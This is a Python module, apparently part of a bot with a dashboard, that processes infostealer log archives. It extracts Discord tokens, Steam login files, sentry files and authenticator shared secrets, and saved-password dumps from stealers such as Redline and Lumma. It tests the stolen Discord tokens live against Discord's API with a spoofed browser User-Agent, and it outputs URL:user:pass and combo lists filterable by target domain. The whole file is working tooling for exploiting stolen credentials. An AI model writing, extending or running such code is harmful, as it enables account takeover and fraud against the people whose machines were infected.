"""
Loot scanning: detect Discord tokens, Steam accounts and saved-password
entries (ULP + combos) inside a directory tree extracted from an
infostealer log archive.

The scanners are deliberately strict so that the output is high signal
("no trash"): tokens must match the exact format the issuing service
uses and vdf files are parsed properly.

Live validation (Discord ``/users/@me``, Steam community xml) is opt-in
via :func:`validate_loot_async`; the scanners themselves are pure
filesystem walks and never touch the network.
"""

from __future__ import annotations

import asyncio
import base64
import json
import os
import re
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Dict, Iterable, List, Optional, Tuple

from loguru import logger

# ─── File-size / scan limits ────────────────────────────────────────

# Hard cap per file we'll read into memory while scanning. Larger files
# are streamed in 1 MB chunks (cheap) or skipped (e.g. ldb >256 MB).
MAX_SCAN_BYTES = 64 * 1024 * 1024
LDB_CHUNK_BYTES = 1024 * 1024
LDB_MAX_BYTES = 256 * 1024 * 1024

# ─── Token + credential regex ───────────────────────────────────────

# Discord auth tokens have two formats. The classic three-segment JWT
# (M*/N*/O* prefix) and the newer ``mfa.<long>`` token.
_DISCORD_TOKEN_RE = re.compile(
    rb"(?:[MNO][A-Za-z0-9_\-]{23,25}\.[A-Za-z0-9_\-]{6,7}\.[A-Za-z0-9_\-]{27,42}"
    rb"|mfa\.[A-Za-z0-9_\-]{84,})"
)

# Bytes that often surround a real token inside LevelDB blobs — used to
# strip leading "token: " or trailing quote / null junk after a match.
_DISCORD_STRIP_RE = re.compile(r"[\"',\s\x00-\x1f]")

# Standard stealer password block headers (Vidar, Redline, Raccoon,
# Lumma, Stealc, Mars, Meta etc.). We try a few synonyms per field.
_PWD_URL_KEYS = ("url", "host", "hostname", "soft", "softs", "site")
_PWD_USER_KEYS = ("login", "user", "username", "user name", "email")
_PWD_PASS_KEYS = ("password", "passwords", "pass", "pwd")

_PWD_FIELD_RE = re.compile(
    r"^\s*([A-Za-z][A-Za-z _]+?)\s*[:=]\s*(.*?)\s*$"
)

# Stealer dumps name their saved-password files several different
# ways. We treat anything matching this as a candidate.
_PWD_FILENAMES = re.compile(
    r"^(all[_\- ]?)?passwords?(\s*\(\d+\))?\.txt$"
    r"|^saved[_\- ]?passwords?\.txt$"
    r"|^pwd\.txt$",
    re.IGNORECASE,
)

# ─── Steam ──────────────────────────────────────────────────────────

# Steam stores known logins in ``config/loginusers.vdf`` (text VDF).
# Sentry files (``ssfn*``) carry the machine-auth blob. Mobile
# Authenticator dumps are JSON ``.maFile`` files.
_SSFN_RE = re.compile(r"^ssfn[A-Za-z0-9]+$", re.IGNORECASE)
_LOGINUSERS_RE = re.compile(r"loginusers\.vdf$", re.IGNORECASE)


# ════════════════════════════════════════════════════════════════════
#  Dataclasses — public result types
# ════════════════════════════════════════════════════════════════════


@dataclass
class DiscordToken:
    """A Discord authentication token recovered from disk."""

    token: str
    source_file: str
    redacted: str = ""
    valid: Optional[bool] = None
    user_id: str = ""
    username: str = ""
    global_name: str = ""
    email: str = ""
    phone: str = ""
    mfa_enabled: Optional[bool] = None
    verified: Optional[bool] = None
    locale: str = ""
    nitro: str = ""
    error: str = ""

    def __post_init__(self) -> None:
        if not self.redacted:
            self.redacted = _redact_token(self.token)


@dataclass
class SteamAccount:
    """A Steam account (with optional sentry / authenticator material)."""

    source_file: str
    steam_id: str = ""
    account_name: str = ""
    persona_name: str = ""
    remember_password: Optional[bool] = None
    most_recent: Optional[bool] = None
    timestamp: int = 0
    ssfn_files: List[str] = field(default_factory=list)
    mafile_path: str = ""
    mafile_shared_secret: str = ""
    valid: Optional[bool] = None
    profile_url: str = ""
    error: str = ""


@dataclass
class CredentialEntry:
    """A single ``URL : USER : PASS`` block from a stealer password dump."""

    url: str
    username: str
    password: str
    source_file: str
    domain: str = ""
    soft: str = ""


@dataclass
class LootResult:
    """Aggregated output of a full log-archive scan."""

    discord: List[DiscordToken] = field(default_factory=list)
    steam: List[SteamAccount] = field(default_factory=list)
    credentials: List[CredentialEntry] = field(default_factory=list)
    scanned_files: int = 0
    errors: List[str] = field(default_factory=list)


# ════════════════════════════════════════════════════════════════════
#  Helpers
# ════════════════════════════════════════════════════════════════════


def _redact_token(token: str) -> str:
    if len(token) <= 14:
        return token[:4] + "***"
    return f"{token[:6]}...{token[-4:]}"


def _domain_from_url(url: str) -> str:
    """Best-effort host extraction. Returns the eTLD+1 in lowercase, or
    just the raw netloc when we cannot parse out a public suffix."""
    if not url:
        return ""
    raw = url.strip()
    if "://" not in raw:
        raw = "http://" + raw
    try:
        netloc = urllib.parse.urlparse(raw).netloc.lower()
    except ValueError:
        return ""
    netloc = netloc.split("@")[-1]
    netloc = netloc.split(":")[0]
    if not netloc:
        return ""
    parts = netloc.split(".")
    if len(parts) <= 2:
        return netloc
    # crude eTLD+1: keep last two components unless the second-last is
    # itself a TLD-shaped suffix (co.uk, com.br, ...). The list is
    # short on purpose — for output filenames we don't need IANA-level
    # accuracy, only consistent grouping.
    second_level = {
        "co.uk", "co.in", "co.jp", "co.kr", "com.br", "com.au",
        "com.mx", "com.ar", "com.tr", "com.cn", "com.tw", "com.sa",
        "org.uk", "ac.uk", "gov.uk", "net.au",
    }
    tail2 = ".".join(parts[-2:])
    if tail2 in second_level and len(parts) >= 3:
        return ".".join(parts[-3:])
    return tail2


def _read_text(path: str, *, max_bytes: int = MAX_SCAN_BYTES) -> str:
    """Read a small text file, capped at *max_bytes*. Returns empty
    string on any error so the caller can continue scanning."""
    try:
        with open(path, "rb") as fh:
            data = fh.read(max_bytes)
    except OSError:
        return ""
    return data.decode("utf-8", errors="ignore")


def _walk_files(root: str) -> Iterable[Tuple[str, str]]:
    """Yield ``(dirpath, filename)`` for every file under *root*."""
    for dirpath, _dirs, files in os.walk(root):
        for name in files:
            yield dirpath, name


# ════════════════════════════════════════════════════════════════════
#  Discord token scanner
# ════════════════════════════════════════════════════════════════════


# Filenames where stealers commonly drop already-extracted tokens. We
# also scan all files inside the Discord roaming folder.
_DISCORD_PLAINTEXT_FILES = re.compile(
    r"^(discord|tokens?|discord_tokens?)\.txt$", re.IGNORECASE,
)
_DISCORD_LDB_RE = re.compile(r"\.(ldb|log|leveldb)$", re.IGNORECASE)
_DISCORD_PATH_HINT = re.compile(
    r"(discord|discordcanary|discordptb)[/\\]",
    re.IGNORECASE,
)


def _discord_user_id_from_token(token: str) -> str:
    """Decode the leading segment of a classic Discord token and return
    the embedded snowflake user ID (or ``""`` if the prefix is not a
    valid base64 → decimal snowflake)."""
    if not token or "." not in token:
        return ""
    head = token.split(".", 1)[0]
    if not head:
        return ""
    # Discord uses urlsafe base64 with the padding stripped. Re-pad and
    # decode; reject anything that doesn't come out to an ASCII decimal
    # snowflake of plausible length.
    padded = head + "=" * (-len(head) % 4)
    try:
        decoded = base64.urlsafe_b64decode(padded.encode("ascii"))
        text = decoded.decode("ascii", errors="strict")
    except Exception:
        return ""
    if not text.isdigit():
        return ""
    if not (15 <= len(text) <= 22):
        return ""
    return text


def _extract_tokens_from_bytes(blob: bytes) -> List[str]:
    """Return every Discord token literal contained in *blob*.

    The regex match is intentionally loose so we can catch tokens
    surrounded by binary junk in LevelDB blobs; we then verify the
    leading segment decodes to a valid Discord snowflake user-ID,
    which kills almost all of the false positives that come from
    random base64-like noise.
    """
    tokens: List[str] = []
    for m in _DISCORD_TOKEN_RE.finditer(blob):
        try:
            tok = m.group(0).decode("ascii", errors="ignore")
        except UnicodeDecodeError:
            continue
        tok = _DISCORD_STRIP_RE.sub("", tok)
        if not tok:
            continue
        # The ``mfa.<long>`` variant doesn't carry a user-ID prefix;
        # only the classic 3-segment tokens do.
        if not tok.startswith("mfa.") and not _discord_user_id_from_token(tok):
            continue
        tokens.append(tok)
    return tokens


def _extract_tokens_from_file(path: str) -> List[str]:
    try:
        size = os.path.getsize(path)
    except OSError:
        return []
    if size == 0 or size > LDB_MAX_BYTES:
        return []
    tokens: List[str] = []
    try:
        if size <= LDB_CHUNK_BYTES:
            with open(path, "rb") as fh:
                tokens.extend(_extract_tokens_from_bytes(fh.read()))
        else:
            # Stream in overlapping chunks so a token straddling a
            # chunk boundary still matches.
            overlap = 256
            with open(path, "rb") as fh:
                tail = b""
                while True:
                    chunk = fh.read(LDB_CHUNK_BYTES)
                    if not chunk:
                        break
                    tokens.extend(
                        _extract_tokens_from_bytes(tail + chunk)
                    )
                    tail = chunk[-overlap:]
    except OSError:
        return []
    return tokens


def scan_discord_tokens(root: str) -> List[DiscordToken]:
    """Walk *root* and return every Discord token literal we can find.

    Plaintext stealer dumps (``tokens.txt``, ``discord.txt``) are
    parsed line-wise. Real LevelDB / log files from a Discord roaming
    folder are scanned in chunks. Duplicates are collapsed so the
    output is deduplicated by token string.
    """
    seen: Dict[str, DiscordToken] = {}

    def _accept(token: str) -> bool:
        """Final per-token sanity check: classic tokens must decode to
        a valid snowflake user-ID; ``mfa.*`` tokens pass through.

        Stops random base64-shaped strings (e.g. cryptographic nonces,
        CSRF tokens) from being reported as Discord auth tokens.
        """
        if not token:
            return False
        if token.startswith("mfa."):
            return len(token) >= 88
        return bool(_discord_user_id_from_token(token))

    for dirpath, name in _walk_files(root):
        path = os.path.join(dirpath, name)
        rel = os.path.relpath(path, root)
        if _DISCORD_PLAINTEXT_FILES.match(name):
            text = _read_text(path, max_bytes=8 * 1024 * 1024)
            for line in text.splitlines():
                # Plain-text dumps usually carry one token per line.
                token = line.strip().strip('"').strip("'")
                token = token.split()[0] if token.split() else ""
                if (
                    token
                    and _DISCORD_TOKEN_RE.match(token.encode())
                    and _accept(token)
                ):
                    if token not in seen:
                        seen[token] = DiscordToken(
                            token=token, source_file=rel,
                        )
        elif _DISCORD_LDB_RE.search(name) or _DISCORD_PATH_HINT.search(rel):
            for tok in _extract_tokens_from_file(path):
                if not _accept(tok):
                    continue
                if tok not in seen:
                    seen[tok] = DiscordToken(token=tok, source_file=rel)
    return list(seen.values())


# ════════════════════════════════════════════════════════════════════
#  Steam scanner
# ════════════════════════════════════════════════════════════════════


def _parse_vdf(text: str) -> Dict:
    """Very small Valve KeyValues parser. Handles nested blocks and
    quoted strings. Returns a nested dict; values are strings.

    We deliberately avoid pulling in the third-party ``vdf`` package
    so the bot has zero extra runtime deps for this feature.
    """
    pos = 0
    n = len(text)

    def skip_ws() -> None:
        nonlocal pos
        while pos < n:
            ch = text[pos]
            if ch in " \t\r\n":
                pos += 1
            elif ch == "/" and pos + 1 < n and text[pos + 1] == "/":
                while pos < n and text[pos] != "\n":
                    pos += 1
            else:
                break

    def read_token() -> str:
        nonlocal pos
        skip_ws()
        if pos >= n:
            return ""
        if text[pos] == '"':
            pos += 1
            start = pos
            while pos < n and text[pos] != '"':
                if text[pos] == "\\" and pos + 1 < n:
                    pos += 2
                else:
                    pos += 1
            tok = text[start:pos]
            if pos < n:
                pos += 1
            return tok
        if text[pos] in "{}":
            ch = text[pos]
            pos += 1
            return ch
        start = pos
        while pos < n and text[pos] not in ' \t\r\n"{}':
            pos += 1
        return text[start:pos]

    def parse_block() -> Dict:
        block: Dict = {}
        while True:
            key = read_token()
            if key == "" or key == "}":
                return block
            skip_ws()
            if pos < n and text[pos] == "{":
                pos_save = pos + 1
                pos_local = pos
                # advance past the '{'
                _ = read_token()
                block[key] = parse_block()
                # consume the matching '}'
                _ = pos_save  # noqa: B018 (silence linter)
                _ = pos_local
            else:
                val = read_token()
                block[key] = val

    return parse_block()


def _parse_loginusers(path: str) -> List[SteamAccount]:
    """Parse ``loginusers.vdf`` and return one :class:`SteamAccount`
    per recorded user."""
    raw = _read_text(path, max_bytes=2 * 1024 * 1024)
    if not raw:
        return []
    try:
        tree = _parse_vdf(raw)
    except Exception:
        logger.exception("Failed to parse loginusers vdf {}", path)
        return []
    users_node = tree.get("users") or {}
    if not isinstance(users_node, dict):
        return []
    accounts: List[SteamAccount] = []
    for steam_id, attrs in users_node.items():
        if not isinstance(attrs, dict):
            continue
        acc = SteamAccount(
            source_file=path,
            steam_id=steam_id,
            account_name=attrs.get("AccountName", ""),
            persona_name=attrs.get("PersonaName", ""),
            profile_url=(
                f"https://steamcommunity.com/profiles/{steam_id}"
                if steam_id.isdigit() else ""
            ),
        )
        rp = attrs.get("RememberPassword", "")
        mr = attrs.get("MostRecent", "")
        ts = attrs.get("Timestamp", "")
        if rp in ("0", "1"):
            acc.remember_password = rp == "1"
        if mr in ("0", "1"):
            acc.most_recent = mr == "1"
        if ts.isdigit():
            acc.timestamp = int(ts)
        accounts.append(acc)
    return accounts


def _parse_mafile(path: str) -> Optional[SteamAccount]:
    """``.maFile`` is JSON; pull SteamID + the shared_secret so the
    operator can re-link the authenticator. We never log the actual
    secret value."""
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as fh:
            data = json.load(fh)
    except (OSError, json.JSONDecodeError):
        return None
    if not isinstance(data, dict):
        return None
    steam_id = str(data.get("Session", {}).get("SteamID", "") or
                   data.get("steamid", "") or "")
    acc_name = data.get("account_name", "") or ""
    secret = data.get("shared_secret", "") or ""
    if not (steam_id or acc_name or secret):
        return None
    return SteamAccount(
        source_file=path,
        steam_id=steam_id,
        account_name=acc_name,
        mafile_path=path,
        mafile_shared_secret=secret,
        profile_url=(
            f"https://steamcommunity.com/profiles/{steam_id}"
            if steam_id.isdigit() else ""
        ),
    )


def scan_steam(root: str) -> List[SteamAccount]:
    """Find ``loginusers.vdf`` + sentry files + ``.maFile`` entries.

    Sentry files (``ssfn*``) are attached to whichever account shares
    their containing folder; this matches how Steam stores them on
    disk."""
    accounts: List[SteamAccount] = []
    ssfn_by_dir: Dict[str, List[str]] = {}
    mafiles: List[str] = []

    for dirpath, name in _walk_files(root):
        path = os.path.join(dirpath, name)
        rel = os.path.relpath(path, root)
        if _LOGINUSERS_RE.search(name):
            accounts.extend(_parse_loginusers(path))
            # rewrite source_file to be relative for cleaner reporting
            for acc in accounts:
                if acc.source_file == path:
                    acc.source_file = rel
        elif _SSFN_RE.match(name):
            ssfn_by_dir.setdefault(dirpath, []).append(rel)
        elif name.lower().endswith(".mafile"):
            mafiles.append(path)

    for ma in mafiles:
        acc = _parse_mafile(ma)
        if acc:
            acc.source_file = os.path.relpath(ma, root)
            accounts.append(acc)

    # Attach any sentry files we found to accounts that live in the
    # same directory tree.
    for acc in accounts:
        acc_dir = os.path.dirname(os.path.join(root, acc.source_file))
        for d, files in ssfn_by_dir.items():
            if d == acc_dir or d.startswith(acc_dir + os.sep):
                acc.ssfn_files.extend(files)
        acc.ssfn_files = sorted(set(acc.ssfn_files))

    return accounts


# ════════════════════════════════════════════════════════════════════
#  Password file scanner (ULP + combos)
# ════════════════════════════════════════════════════════════════════


def _parse_password_dump(text: str, source: str) -> List[CredentialEntry]:
    """Parse a stealer-style ``Passwords.txt`` block format.

    Blocks look like::

        URL: https://example.com/login
        Username: alice
        Password: hunter2

    with variants for ``Host`` / ``Soft`` / ``Login`` headers. Blocks
    are separated by blank lines, ``=`` rules, or the start of the
    next ``URL:`` header.
    """
    entries: List[CredentialEntry] = []
    cur: Dict[str, str] = {}

    def flush() -> None:
        url = cur.get("url", "")
        user = cur.get("user", "")
        pwd = cur.get("pass", "")
        if (url or user) and pwd:
            entries.append(
                CredentialEntry(
                    url=url,
                    username=user,
                    password=pwd,
                    source_file=source,
                    domain=_domain_from_url(url) or _domain_from_url(
                        cur.get("soft", "")
                    ),
                    soft=cur.get("soft", ""),
                )
            )
        cur.clear()

    for raw_line in text.splitlines():
        line = raw_line.rstrip()
        if not line.strip():
            # blank line ends the block
            if cur:
                flush()
            continue
        if set(line.strip()) <= set("=-_*\t "):
            if cur:
                flush()
            continue
        m = _PWD_FIELD_RE.match(line)
        if not m:
            continue
        key = m.group(1).strip().lower()
        val = m.group(2).strip()
        if not val:
            continue
        if key in _PWD_URL_KEYS:
            if "url" in cur:
                flush()
            cur["url"] = val
            if key == "soft":
                cur["soft"] = val
        elif key in _PWD_USER_KEYS:
            cur["user"] = val
        elif key in _PWD_PASS_KEYS:
            cur["pass"] = val
            # password is always the last field in a block — flush.
            flush()
    if cur:
        flush()
    return entries


def scan_passwords(root: str) -> List[CredentialEntry]:
    """Find every recognised saved-password file in *root* and return
    a flat list of credential entries."""
    out: List[CredentialEntry] = []
    for dirpath, name in _walk_files(root):
        if not _PWD_FILENAMES.match(name):
            continue
        path = os.path.join(dirpath, name)
        rel = os.path.relpath(path, root)
        text = _read_text(path, max_bytes=32 * 1024 * 1024)
        if not text:
            continue
        out.extend(_parse_password_dump(text, rel))
    return out


# ════════════════════════════════════════════════════════════════════
#  Public orchestration entry
# ════════════════════════════════════════════════════════════════════


def scan_directory_for_loot(
    root: str,
    buckets: "frozenset[str] | None" = None,
    progress: Any = None,
) -> LootResult:
    """Run every (or selected) loot scanner over *root* and return the
    aggregated result.

    *buckets* is an optional frozenset of bucket identifiers (e.g.
    ``{"loot_discord"}``).  When ``None`` or empty **all** scanners run.
    Pass specific bucket constants from ``services.loot_extractor`` to
    limit the scan.

    When *progress* is provided it must expose the fields defined on
    :class:`services.extractor.ExtractionProgress` (``loot_bucket`` +
    ``loot_counts``); the scanner updates those fields between buckets
    so the dashboard can show live progress per scanner.
    """
    run_all = not buckets
    result = LootResult()

    def _set_bucket(name: str) -> None:
        if progress is not None:
            try:
                progress.loot_bucket = name
            except Exception:
                pass

    def _record_count(name: str, value: int) -> None:
        if progress is not None:
            try:
                progress.loot_counts[name] = value
            except Exception:
                pass

    if run_all or "loot_discord" in buckets:
        _set_bucket("discord")
        try:
            result.discord = scan_discord_tokens(root)
            _record_count("discord", len(result.discord))
        except Exception as exc:
            logger.exception("scan_discord_tokens failed")
            result.errors.append(f"discord scan failed: {exc}")
    if run_all or "loot_steam" in buckets:
        _set_bucket("steam")
        try:
            result.steam = scan_steam(root)
            _record_count("steam", len(result.steam))
        except Exception as exc:
            logger.exception("scan_steam failed")
            result.errors.append(f"steam scan failed: {exc}")
    if run_all or "loot_passwords" in buckets:
        _set_bucket("passwords")
        try:
            result.credentials = scan_passwords(root)
            _record_count("passwords", len(result.credentials))
        except Exception as exc:
            logger.exception("scan_passwords failed")
            result.errors.append(f"password scan failed: {exc}")
    _set_bucket("")
    return result


# ════════════════════════════════════════════════════════════════════
#  Validation (network) — opt-in, async, best-effort
# ════════════════════════════════════════════════════════════════════


async def _validate_discord_token(session, token: DiscordToken) -> None:
    """Hit Discord's ``/users/@me`` with the recovered token.

    Updates *token* in place. Distinguishes truly-dead tokens (HTTP
    401) from rate-limiting / network errors / API changes so the
    dashboard can show ``DEAD`` only when the API actually says so.
    Retries once on ``429 Too Many Requests`` honouring the
    server-supplied ``retry_after`` window.
    """
    headers = {
        "Authorization": token.token,
        # Match Discord's web client UA — bare/empty UAs are blocked.
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ),
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://discord.com",
        "Referer": "https://discord.com/channels/@me",
        "X-Discord-Locale": "en-US",
    }
    url = "https://discord.com/api/v9/users/@me"

    for attempt in (1, 2):
        try:
            async with session.get(url, headers=headers, timeout=15) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    token.valid = True
                    token.user_id = str(data.get("id", "") or "")
                    token.username = data.get("username", "") or ""
                    token.global_name = data.get("global_name", "") or ""
                    token.email = data.get("email", "") or ""
                    token.phone = data.get("phone", "") or ""
                    token.mfa_enabled = bool(data.get("mfa_enabled", False))
                    token.verified = bool(data.get("verified", False))
                    token.locale = data.get("locale", "") or ""
                    # premium_type: 0=none, 1=classic, 2=full, 3=basic
                    pt = data.get("premium_type")
                    token.nitro = {
                        0: "none", 1: "classic", 2: "nitro", 3: "basic",
                    }.get(pt, "")
                    token.error = ""
                    return
                if resp.status == 401:
                    token.valid = False
                    token.error = "401 unauthorised (token revoked / expired)"
                    return
                if resp.status == 429 and attempt == 1:
                    # Rate-limited — back off and try once more.
                    try:
                        body = await resp.json()
                        delay = float(body.get("retry_after", 1.0))
                    except Exception:
                        delay = 1.0
                    await asyncio.sleep(min(delay, 5.0))
                    continue
                if resp.status == 403:
                    # Account locked / disabled / cloudflare block — leave
                    # ``valid`` as unknown rather than claiming DEAD.
                    token.valid = None
                    token.error = "403 forbidden (locked or blocked)"
                    return
                token.valid = None
                token.error = f"HTTP {resp.status}"
                return
        except asyncio.TimeoutError:
            token.valid = None
            token.error = "timeout"
            return
        except Exception as exc:
            token.valid = None
            token.error = f"{type(exc).__name__}: {exc}"
            return


async def _validate_steam_account(session, acc: SteamAccount) -> None:
    """Cheap public-profile probe. We don't have credentials to test
    the saved login itself, so we just confirm the SteamID resolves to
    a real profile."""
    if not acc.steam_id or not acc.steam_id.isdigit():
        return
    url = f"https://steamcommunity.com/profiles/{acc.steam_id}?xml=1"
    try:
        async with session.get(url, timeout=10) as resp:
            if resp.status != 200:
                acc.error = f"HTTP {resp.status}"
                return
            text = await resp.text()
            # Steam returns an XML doc with <steamID> for real users.
            if "<steamID>" in text:
                acc.valid = True
            else:
                acc.valid = False
                acc.error = "profile not found"
    except asyncio.TimeoutError:
        acc.error = "timeout"
    except Exception as exc:
        acc.error = str(exc)


async def validate_loot_async(
    loot: LootResult,
    *,
    validate_discord: bool = True,
    validate_steam: bool = True,
    concurrency: int = 8,
    progress: Any = None,
) -> None:
    """Run the optional network-validation pass.

    Discord tokens and Steam accounts are hit in parallel with a small
    concurrency budget to stay polite.

    When *progress* is passed in (an :class:`ExtractionProgress`-shaped
    object) the dashboard fields ``loot_validate_total`` /
    ``loot_validate_done`` are kept in sync as items complete so the
    user sees ``Validating Discord tokens (3/12)`` live.
    """
    # Import aiohttp lazily so a user running the scanners offline
    # never pays the import cost.
    try:
        import aiohttp
    except ImportError:
        logger.warning("aiohttp missing — skipping loot validation")
        return

    timeout = aiohttp.ClientTimeout(total=20)
    sem = asyncio.Semaphore(max(1, concurrency))

    # Use a real browser UA at the session level too — Discord/Steam
    # rate-limit or outright reject the bot-shaped default UAs.
    ua = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    )

    def _bump_done() -> None:
        if progress is not None:
            try:
                progress.loot_validate_done += 1
            except Exception:
                pass

    async def _run(coro):
        async with sem:
            try:
                await coro
            finally:
                _bump_done()

    async with aiohttp.ClientSession(
        timeout=timeout,
        headers={"User-Agent": ua},
    ) as session:
        tasks = []
        if validate_discord:
            tasks.extend(
                _run(_validate_discord_token(session, tk))
                for tk in loot.discord
            )
        if validate_steam:
            tasks.extend(
                _run(_validate_steam_account(session, acc))
                for acc in loot.steam
            )
        if progress is not None:
            try:
                progress.loot_validate_total = len(tasks)
                progress.loot_validate_done = 0
            except Exception:
                pass
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

    # Finalise the live counts so the dashboard reads the validated
    # totals instead of staying at the pre-validation numbers.
    if progress is not None:
        try:
            progress.loot_valid_counts["discord"] = sum(
                1 for t in loot.discord if t.valid is True
            )
            progress.loot_valid_counts["steam"] = sum(
                1 for a in loot.steam if a.valid is True
            )
        except Exception:
            pass


# ════════════════════════════════════════════════════════════════════
#  ULP / Combo output builders
# ════════════════════════════════════════════════════════════════════


def build_ulp_text(entries: Iterable[CredentialEntry]) -> str:
    """Render ``URL:USER:PASS`` per line."""
    lines: List[str] = []
    for e in entries:
        if not (e.username and e.password):
            continue
        url = e.url or e.soft or e.domain or "unknown"
        # Replace ``:`` inside the url with %3A so the trailing
        # ``:user:pass`` split is unambiguous.
        url_safe = url.replace("\n", " ").replace("\r", " ")
        user_safe = e.username.replace("\n", " ")
        pwd_safe = e.password.replace("\n", " ")
        lines.append(f"{url_safe}:{user_safe}:{pwd_safe}")
    return "\n".join(lines) + ("\n" if lines else "")


def build_combo_text(entries: Iterable[CredentialEntry]) -> str:
    """Render ``USER:PASS`` per line (no URL)."""
    lines: List[str] = []
    seen: set[Tuple[str, str]] = set()
    for e in entries:
        if not (e.username and e.password):
            continue
        key = (e.username, e.password)
        if key in seen:
            continue
        seen.add(key)
        lines.append(f"{e.username}:{e.password}")
    return "\n".join(lines) + ("\n" if lines else "")


def build_structured_combo_text(
    entries: Iterable[CredentialEntry],
) -> str:
    """Render combos grouped by domain header::

        === claude.ai ===
        user1:pass1
        user2:pass2

        === spotify.com ===
        user3:pass3
    """
    by_domain: Dict[str, List[CredentialEntry]] = {}
    for e in entries:
        if not (e.username and e.password):
            continue
        key = e.domain or "unknown"
        by_domain.setdefault(key, []).append(e)

    chunks: List[str] = []
    for domain in sorted(by_domain.keys()):
        chunks.append(f"=== {domain} ===")
        seen: set[Tuple[str, str]] = set()
        for e in by_domain[domain]:
            t = (e.username, e.password)
            if t in seen:
                continue
            seen.add(t)
            chunks.append(f"{e.username}:{e.password}")
        chunks.append("")
    return "\n".join(chunks).rstrip() + "\n" if chunks else ""


def filter_credentials(
    entries: Iterable[CredentialEntry],
    target_domains: Iterable[str],
) -> List[CredentialEntry]:
    """Return only entries whose ``domain`` matches one of *target_domains*
    (substring match, case-insensitive)."""
    needles = [d.strip().lower().lstrip(".") for d in target_domains
               if d and d.strip()]
    if not needles:
        return list(entries)
    out: List[CredentialEntry] = []
    for e in entries:
        haystack = (
            e.domain or _domain_from_url(e.url) or e.soft or e.url
        ).lower()
        if any(n in haystack for n in needles):
            out.append(e)
    return out
